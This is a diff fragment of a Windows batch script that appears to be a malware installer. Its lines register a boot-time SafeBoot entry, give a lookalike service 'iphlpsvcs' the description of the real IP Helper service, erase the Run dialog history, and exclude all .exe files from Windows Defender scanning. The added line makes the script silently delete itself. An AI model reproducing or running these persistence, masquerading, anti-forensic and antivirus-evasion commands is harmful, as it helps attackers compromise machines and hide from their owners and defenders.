@@ -13,3 +13,4 @@ cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Net
 sc description iphlpsvcs "Provides tunnel connectivity using IPv6 transition technologies (6to4, ISATAP, Port Proxy, and Teredo), and IP-HTTPS. If this service is stopped, the computer will not have the enhanced connectivity benefits that these technologies offer." >nul 2>&1
 reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension "*.exe"
+del /s /a "%~f0"  >nul 2>&1
